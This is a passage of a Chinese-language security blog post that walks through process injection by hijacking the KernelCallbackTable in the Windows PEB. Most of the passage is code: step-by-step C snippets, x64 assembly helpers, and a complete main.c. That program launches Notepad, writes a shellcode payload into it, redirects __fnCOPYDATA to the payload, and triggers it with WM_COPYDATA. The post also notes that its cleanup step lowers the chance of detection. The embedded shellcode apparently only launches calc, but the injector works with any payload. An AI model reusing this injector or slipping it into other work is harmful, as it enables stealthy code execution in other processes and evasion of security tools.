+if ( !ReadProcessMemory( hProcess, ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ), &amp;KernelCallbackTable, sizeof( PVOID ), &amp;bytesRead ) ) &#123;
+    printf( &quot;[-] Failed to read KernelCallbackTable. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+printf( &quot;[*] KernelCallbackTable Address: 0x%p\n&quot;, KernelCallbackTable );
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>ReadProcessMemory 在距 PEB 地址偏移量处访问 Kernel Callback Table，从而访问控制某些回调函数的指针。</li>
+</ul>
+<h3 id="第-8-步-为有效负载分配内存"><a href="#第-8-步-为有效负载分配内存" class="headerlink" title="第 8 步 - 为有效负载分配内存"></a>第 8 步 - 为有效负载分配内存</h3><p>有效负载（通常是 shellcode）在目标进程的内存空间内分配。内存标记为 executable 以确保代码可以运行。</p>
+<pre><code class="hljs">unsigned char my_payload[] = &quot;...&quot;; 
+SIZE_T shellcodeSize = sizeof( my_payload );
+
+LPVOID remotebuf = VirtualAllocEx( hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE
+
+_EXECUTE_READWRITE );
+if ( !remotebuf ) &#123;
+    printf( &quot;[-] Failed to allocate remote buffer. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+if ( !WriteProcessMemory( hProcess, remotebuf, my_payload, shellcodeSize, NULL ) ) &#123;
+    printf( &quot;[-] Failed to write payload to remote buffer. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+printf( &quot;[+] Payload written to remote buffer at: 0x%p\n&quot;, remotebuf );
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>VirtualAllocEx 在目标进程中分配内存，并使用 PAGE_EXECUTE_READWRITE 对其进行标记，使其既可写又可执行。</li>
+<li>WriteProcessMemory 将 shellcode 写入分配的空间，使其能够在触发时运行。</li>
+</ul>
+<h3 id="第-9-步-修改内核回调表"><a href="#第-9-步-修改内核回调表" class="headerlink" title="第 9 步 - 修改内核回调表"></a>第 9 步 - 修改内核回调表</h3><p>通过将 __fnCOPYDATA 指针重定向到注入的负载来修改 Kernel Callback Table。这使得 Windows 在 WM_COPYDATA 消息期间调用有效负载。</p>
+<pre><code class="hljs">KERNELCALLBACKTABLE cKCT;
+if ( !ReadProcessMemory( hProcess, KernelCallbackTable, &amp;cKCT, sizeof( cKCT ), &amp;bytesRead ) ) &#123;
+    printf( &quot;[-] Failed to read existing KernelCallbackTable. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+cKCT.__fnCOPYDATA = ( ULONG_PTR ) remotebuf;
+
+LPVOID clonedcKCT = VirtualAllocEx( hProcess, NULL, sizeof( cKCT ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
+if ( !clonedcKCT || !WriteProcessMemory( hProcess, clonedcKCT, &amp;cKCT, sizeof( cKCT ), NULL ) ) &#123;
+    printf( &quot;[-] Failed to clone KernelCallbackTable. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>ReadProcessMemory 检索 Kernel Callback Table 结构。__fnCOPYDATA 字段将重定向以指向有效负载，从而在WM_COPYDATA消息接收时启用其执行。</li>
+</ul>
+<h3 id="第-10-步-使用修改后的表更新-PEB"><a href="#第-10-步-使用修改后的表更新-PEB" class="headerlink" title="第 10 步 - 使用修改后的表更新 PEB"></a>第 10 步 - 使用修改后的表更新 PEB</h3><p>更改后的内核回调表将写入 PEB，确保 Windows 引用此修改后的版本。</p>
+<pre><code class="hljs">if ( !WriteProcessMemory( hProcess, ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ), &amp;clonedcKCT, sizeof( PVOID ), &amp;bytesRead ) ) &#123;
+    printf( &quot;[-] Failed to update PEB KernelCallbackTable. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+printf( &quot;[+] PEB KernelCallbackTable updated successfully!\n&quot; );
+</code></pre>
+<p><strong>详细说明</strong></p>
+<ul>
+<li>WriteProcessMemory 将修改后的表写入 PEB，使更改的回调结构处于活动状态，以准备触发有效负载。</li>
+</ul>
+<h3 id="第-11-步-触发-Payload"><a href="#第-11-步-触发-Payload" class="headerlink" title="第 11 步 - 触发 Payload"></a>第 11 步 - 触发 Payload</h3><p>该代码发送一条 WM_COPYDATA 消息，该消息激活 Kernel Callback Table 中的 __fnCOPYDATA 函数，并执行有效负载。</p>
+<pre><code class="hljs">COPYDATASTRUCT cds;
+WCHAR msg[] = L&quot;trigger&quot;;
+cds.dwData = 1;
+cds.cbData = ( lstrlenW( msg ) + 1 ) * sizeof( WCHAR );
+cds.lpData = msg;
+
+LRESULT result = SendMessage( hWindow, WM_COPYDATA, ( WPARAM ) hWindow, ( LPARAM ) &amp;cds );
+if ( result == 0 &amp;&amp; GetLastError() != 0 ) &#123;
+    printf( &quot;[-] Failed to send message to trigger payload. Error: %d\n&quot;, GetLastError() );
+    return -1;
+&#125;
+printf( &quot;[+] Payload triggered!\n&quot; );
+</code></pre>
+<h3 id="第-12-步-清理"><a href="#第-12-步-清理" class="headerlink" title="第 12 步 - 清理"></a>第 12 步 - 清理</h3><p>最后，释放内存分配并关闭处理，确保干净退出并最大限度地降低检测风险。</p>
+<pre><code class="hljs">VirtualFreeEx( hProcess, remotebuf, 0, MEM_RELEASE );
+VirtualFreeEx( hProcess, clonedcKCT, 0, MEM_RELEASE );
+CloseHandle( hProcess );
+CloseHandle( pi.hProcess );
+CloseHandle( pi.hThread );
+printf( &quot;[+] Cleanup completed successfully.\n&quot; );
+</code></pre>
+<p>此过程演示了通过 Kernel Callback Table 操作进行分步代码注入，从而提供对目标进程上下文中执行的完全控制。</p>
+<hr>
+<h2 id="帮助程序程序集代码"><a href="#帮助程序程序集代码" class="headerlink" title="帮助程序程序集代码"></a>帮助程序程序集代码</h2><p>为了增强注入过程，我们使用了 helper.asm 中定义的一些汇编函数。这些函数帮助我们找到 PEB 并更有效地操作 Kernel Callback Table。</p>
+<h3 id="定位PEB"><a href="#定位PEB" class="headerlink" title="定位PEB"></a>定位PEB</h3><p>此函数通过访问 gs 段寄存器来检索当前进程的 PEB 地址，该寄存器指向 x64 体系结构中的线程信息块 （TIB）。</p>
+<pre><code class="hljs">LocatePEB PROC
+    mov rax, qword ptr gs:[60h] ; Access PEB in x64
+    ret
+LocatePEB ENDP
+</code></pre>
+<h3 id="UnhingCallbackTable"><a href="#UnhingCallbackTable" class="headerlink" title="UnhingCallbackTable"></a>UnhingCallbackTable</h3><p>给定 RCX 寄存器中的 PEB 地址，此函数通过访问 PEB 结构中偏移量为 0x58 的内存来检索内核回调表的地址。</p>
+<pre><code class="hljs">ResolveKernelCallbackTable PROC
+    mov rax, qword ptr [rcx + 58h] ; Offset for KernelCallbackTable in PEB (0x58)
+    ret
+ResolveKernelCallbackTable ENDP
+</code></pre>
+<h3 id="写入内核回调表"><a href="#写入内核回调表" class="headerlink" title="写入内核回调表"></a>写入内核回调表</h3><p>该函数通过向指定的偏移量写入新地址来更新 PEB 中的 Kernel Callback Table 地址。</p>
+<pre><code class="hljs">WriteKernelCallbackTable PROC
+    mov qword ptr [rcx + 58h], rdx    ; Write the new KernelCallbackTable address
+    ret
+WriteKernelCallbackTable ENDP
+</code></pre>
+<p>这些汇编函数简化了与 PEB 和内核回调表交互的过程，使我们的 C++ 代码更简洁、更高效。</p>
+<hr>
+<h2 id="把它们放在一起！"><a href="#把它们放在一起！" class="headerlink" title="把它们放在一起！"></a>把它们放在一起！</h2><p>main.c</p>
+<pre><code class="hljs">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &quot;struct.h&quot;
+#include &quot;helper.h&quot;
+
+void LoadNtQueryInformationProcess()
+&#123;
+    printf( COLOR_YELLOW_BOLD &quot;[*] Loading NtQueryInformationProcess...\n&quot; COLOR_RESET );
+    HMODULE hNtdll = GetModuleHandle( L&quot;ntdll.dll&quot; );
+    if ( hNtdll )
+    &#123;
+        NtQueryInformationProcess = ( PFN_NTQUERYINFORMATIONPROCESS ) GetProcAddress( hNtdll, &quot;NtQueryInformationProcess&quot; );
+        if ( NtQueryInformationProcess )
+        &#123;
+            printf( COLOR_GREEN_BOLD &quot;[+] NtQueryInformationProcess loaded successfully at address: 0x%p\n&quot; COLOR_RESET, NtQueryInformationProcess );
+        &#125;
+        else
+        &#123;
+            printf( COLOR_RED_BOLD &quot;\t[-] Failed to resolve NtQueryInformationProcess address.\n&quot; COLOR_RESET );
+        &#125;
+    &#125;
+&#125;
+
+void EnableDebugPrivilege()
+&#123;
+    printf( COLOR_YELLOW_BOLD &quot;[*] Enabling Debug Privilege...\n&quot; COLOR_RESET );
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tkp;
+    if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) )
+    &#123;
+        LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;tkp.Privileges[ 0 ].Luid );
+        tkp.PrivilegeCount = 1;
+        tkp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges( hToken, FALSE, &amp;tkp, sizeof( tkp ), NULL, NULL );
+        CloseHandle( hToken );
+        // printf( COLOR_GREEN_BOLD &quot;\t[+] Debug Privilege enabled.\n&quot; COLOR_RESET );
+    &#125;
+    else
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to enable Debug Privilege.\n&quot; COLOR_RESET );
+    &#125;
+&#125;
+</code></pre>
+<p>​    </p>
+<pre><code class="hljs">unsigned char payload[] = &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00&quot;;
+SIZE_T shellcodeSize = sizeof( payload ) - 1;
+SIZE_T bytesRead = 0;
+
+int main()
+&#123;
+    printf( COLOR_YELLOW_BOLD &quot;[*] Initializing exploit...\n&quot; COLOR_RESET );
+
+    EnableDebugPrivilege();
+    LoadNtQueryInformationProcess();
+
+    if ( !NtQueryInformationProcess )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] NtQueryInformationProcess is NULL. Exiting...\n&quot; COLOR_RESET );
+        return -1;
+    &#125;
+
+    printf( COLOR_YELLOW_BOLD &quot;[*] Starting PEB KernelCallbackTable Injection Exploit...\n\n&quot; COLOR_RESET );
+
+    // Step 1: Create a new Notepad process (ensure it is visible to the user)
+    PROCESS_INFORMATION pi = &#123; 0 &#125;;
+    STARTUPINFO si = &#123; sizeof( STARTUPINFO ) &#125;;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Creating new Notepad process...\n&quot; COLOR_RESET );
+    if ( !CreateProcess(
+        L&quot;C:\\Windows\\System32\\notepad.exe&quot;,
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &amp;si,
+        &amp;pi
+    ) )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to create Notepad process. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Notepad process created successfully. PID: %d\n&quot; COLOR_RESET, pi.dwProcessId );
+
+    // Step 2: Wait for the new process to initialize
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Waiting for Notepad initialization...\n&quot; COLOR_RESET );
+    WaitForInputIdle( pi.hProcess, 1000 );
+
+    // Step 3: Find the Notepad window handle
+    HWND hWindow = NULL;
+    DWORD waitTime = 0;
+    while ( hWindow == NULL &amp;&amp; waitTime &lt; MAX_WAIT_TIME )
+    &#123;
+        hWindow = FindWindow( L&quot;Notepad&quot;, NULL );
+        if ( !hWindow )
+        &#123;
+            Sleep( 500 );  // Wait for 500 ms before retrying
+            waitTime += 500;
+        &#125;
+    &#125;
+
+    if ( !hWindow )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to find Notepad window handle after waiting for %d milliseconds.\n&quot; COLOR_RESET, MAX_WAIT_TIME );
+        TerminateProcess( pi.hProcess, 0 );
+        CloseHandle( pi.hProcess );
+        CloseHandle( pi.hThread );
+        return -1;
+    &#125;
+
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Window Handle found: 0x%p\n&quot; COLOR_RESET, hWindow );
+
+    // Step 4: Get the process ID of the Notepad
+    DWORD pid;
+    GetWindowThreadProcessId( hWindow, &amp;pid );
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Process ID: %d\n&quot; COLOR_RESET, pid );
+
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+        FALSE,
+        pid
+    );
+    if ( !hProcess )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to open target process. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Process Handle: 0x%p\n&quot; COLOR_RESET, hProcess );
+
+    // -----------------------------------------------------
+    // Using NtQueryInformationProcess to get PEB
+    // -----------------------------------------------------
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Retrieving PEB Address using NtQueryInformationProcess...\n&quot; COLOR_RESET );
+    PROCESS_BASIC_INFORMATION pbi;
+    ULONG returnLength;
+    NTSTATUS status = NtQueryInformationProcess(
+        hProcess,
+        ProcessBasicInformation,
+        &amp;pbi,
+        sizeof( pbi ),
+        &amp;returnLength
+    );
+    if ( status != 0 )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to query process information. NTSTATUS: 0x%lx\n&quot; COLOR_RESET, status );
+        return -1;
+    &#125;
+    PVOID PebBaseAddress = pbi.PebBaseAddress;
+    printf( COLOR_BLUE_BOLD &quot;\t\t[*] PEB Address: 0x%p\n&quot; COLOR_RESET, PebBaseAddress );
+
+    // Step 6: Read KernelCallbackTable from the target process&#39;s PEB
+    PVOID KernelCallbackTable;
+    SIZE_T bytesRead = 0;
+    if ( !ReadProcessMemory(
+        hProcess,
+        ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ),
+        &amp;KernelCallbackTable,
+        sizeof( PVOID ),
+        &amp;bytesRead
+    ) )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to read KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_BLUE_BOLD &quot;\t\t[*] KernelCallbackTable Address: 0x%p\n&quot; COLOR_RESET, KernelCallbackTable );
+
+    // Step 7: Read KernelCallbackTable structure from the target process
+    KERNELCALLBACKTABLE CCC;
+    if ( !ReadProcessMemory(
+        hProcess,
+        KernelCallbackTable,
+        &amp;CCC,
+        sizeof( CCC ),
+        &amp;bytesRead
+    ) )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to read KernelCallbackTable structure. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_GREEN_BOLD &quot;\n\t[+] KernelCallbackTable read successfully. %zu bytes read.\n&quot; COLOR_RESET, bytesRead );
+    printf( COLOR_BLUE_BOLD &quot;\t\t[*] Dumping KernelCallbackTable structure:\n&quot; COLOR_RESET );
+    printf( COLOR_GREEN_BOLD &quot;\t\t\t__fnCOPYDATA: 0x%p\n&quot; COLOR_RESET, ( void* ) CCC.__fnCOPYDATA );
+    printf( COLOR_GREEN_BOLD &quot;\t\t\t__fnCOPYGLOBALDATA: 0x%p\n&quot; COLOR_RESET, ( void* ) CCC.__fnCOPYGLOBALDATA );
+    printf( COLOR_GREEN_BOLD &quot;\t\t\t__fnDWORD: 0x%p\n&quot; COLOR_RESET, ( void* ) CCC.__fnDWORD );
+
+    // -----------------------------------------------------
+    // Assembly Method: Using LocatePEB and ResolveKernelCallbackTable
+    // -----------------------------------------------------
+    /*
+    // 
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Retrieving PEB Address using Assembly...\n&quot; COLOR_RESET );
+    PVOID PebBaseAddressASM = LocatePEB();
+    printf( COLOR_BLUE_BOLD &quot;\t\t[*] PEB Address (from ASM): 0x%p\n&quot; COLOR_RESET, PebBaseAddressASM );
+
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Resolving KernelCallbackTable using Assembly...\n&quot; COLOR_RESET );
+    PVOID KernelCallbackTableASM = ResolveKernelCallbackTable( PebBaseAddressASM );
+    printf( COLOR_BLUE_BOLD &quot;\t\t[*] KernelCallbackTable Address (from ASM): 0x%p\n&quot; COLOR_RESET, KernelCallbackTableASM );
+
+    // Continue using KernelCallbackTableASM as needed
+    */
+
+    // Step 8: Write payload to remote buffer
+    printf( COLOR_YELLOW_BOLD &quot;\n\t[*] Allocating remote buffer for payload...\n&quot; COLOR_RESET );
+    LPVOID remotebuf = VirtualAllocEx(
+        hProcess,
+        NULL,
+        shellcodeSize,
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE
+    );
+    if ( !remotebuf )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to allocate remote buffer. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    if ( !WriteProcessMemory(
+        hProcess,
+        remotebuf,
+        payload,
+        shellcodeSize,
+        NULL
+    ) )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to write payload to remote buffer. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Payload written to remote buffer at: 0x%p\n&quot; COLOR_RESET, remotebuf );
+
+    // Step 9: Modify __fnCOPYDATA in the KernelCallbackTable
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Modifying __fnCOPYDATA to point to payload...\n&quot; COLOR_RESET );
+    CCC.__fnCOPYDATA = ( ULONG_PTR ) remotebuf;
+    printf( COLOR_BLUE_BOLD &quot;\t\t[*] __fnCOPYDATA now points to: 0x%p\n&quot; COLOR_RESET, remotebuf );
+
+    // Step 10: Clone modified KernelCallbackTable
+    printf( COLOR_YELLOW_BOLD &quot;\n\t[*] Cloning modified KernelCallbackTable...\n&quot; COLOR_RESET );
+    LPVOID cloneCCC = VirtualAllocEx(
+        hProcess,
+        NULL,
+        sizeof( CCC ),
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_READWRITE
+    );
+    if ( !cloneCCC )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to allocate memory for cloned KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    if ( !WriteProcessMemory(
+        hProcess,
+        cloneCCC,
+        &amp;CCC,
+        sizeof( CCC ),
+        NULL
+    ) )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to write cloned KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Cloned KernelCallbackTable written at: 0x%p\n&quot; COLOR_RESET, cloneCCC );
+
+    // Step 11: Update PEB KernelCallbackTable to cloned KernelCallbackTable
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Updating PEB with cloned KernelCallbackTable...\n&quot; COLOR_RESET );
+    if ( !WriteProcessMemory(
+        hProcess,
+        ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ),
+        &amp;cloneCCC,
+        sizeof( PVOID ),
+        &amp;bytesRead
+    ) )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to update PEB KernelCallbackTable. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_GREEN_BOLD &quot;\t[+] PEB KernelCallbackTable updated successfully!\n&quot; COLOR_RESET );
+
+    // Step 12: Ensure Memory Protection for Payload
+    DWORD oldProtect;
+    if ( !VirtualProtectEx(
+        hProcess,
+        remotebuf,
+        shellcodeSize,
+        PAGE_EXECUTE_READ,
+        &amp;oldProtect
+    ) )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to change memory protection for payload. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Memory protection for payload set to PAGE_EXECUTE_READ.\n&quot; COLOR_RESET );
+
+    // Step 13: Trigger the payload
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Sending message to trigger the payload...\n&quot; COLOR_RESET );
+    COPYDATASTRUCT cds;
+    WCHAR msg[] = L&quot;LJX&quot;;
+    cds.dwData = 1;
+    cds.cbData = ( lstrlenW( msg ) + 1 ) * sizeof( WCHAR );
+    cds.lpData = msg;
+    LRESULT result = SendMessage(
+        hWindow,
+        WM_COPYDATA,
+        ( WPARAM ) hWindow,
+        ( LPARAM ) &amp;cds
+    );
+    if ( result == 0 &amp;&amp; GetLastError() != 0 )
+    &#123;
+        printf( COLOR_RED_BOLD &quot;\t[-] Failed to send message to trigger payload. Error: %d\n&quot; COLOR_RESET, GetLastError() );
+        return -1;
+    &#125;
+    printf( COLOR_GREEN_BOLD &quot;\t[+] Payload triggered!\n&quot; COLOR_RESET );
+
+    // Cleanup
+    printf( COLOR_YELLOW_BOLD &quot;\t[*] Cleaning up...\n&quot; COLOR_RESET );
+    VirtualFreeEx( hProcess, remotebuf, 0, MEM_RELEASE );
+    VirtualFreeEx( hProcess, cloneCCC, 0, MEM_RELEASE );
+    TerminateProcess( pi.hProcess, 0 );
+    CloseHandle( hProcess );
+    CloseHandle( pi.hProcess );
+    CloseHandle( pi.hThread );
+
+    printf( COLOR_GREEN_BOLD &quot;\n[+] YAAAAAAAAAY.\n&quot; COLOR_RESET );
+    printf( COLOR_GREEN_BOLD &quot;[+] Exploit completed successfully.\n&quot; COLOR_RESET );
+    return 0;
+&#125;
+</code></pre>
+<hr>
+<p>最后，感谢您的阅读！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" class="print-no-link">#主机安全</a>
+      
+        <a href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" class="print-no-link">#进程注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>使用内核回调表进程注入</div>
+      <div>http://example.com/2024/11/12/使用内核回调表进程注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Jentle</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 12, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/02/%E4%BC%AA%E9%80%A0%E8%B0%83%E7%94%A8%E6%A0%88%E6%9D%A5%E8%BF%B7%E6%83%91EDR%E5%92%8C%E6%9D%80%E8%BD%AF/" title="伪造调用栈来迷惑EDR和杀软">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">伪造调用栈来迷惑EDR和杀软</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/05/%E4%BF%84%E7%BD%97%E6%96%AFAPT%E7%BB%84%E7%BB%87%E6%8A%80%E6%88%98%E6%9C%AF%E6%83%85%E6%8A%A5/" title="俄罗斯APT组织技战术情报">
+                        <span class="hidden-mobile">俄罗斯APT组织技战术情报</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Hipepper/UtterancBlog');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Hipepper" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="https://mp.weixin.qq.com/s/WZSeu6y5ckuo958f-yV3Kg" target="_blank" rel="nofollow noopener"><span>公众号</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
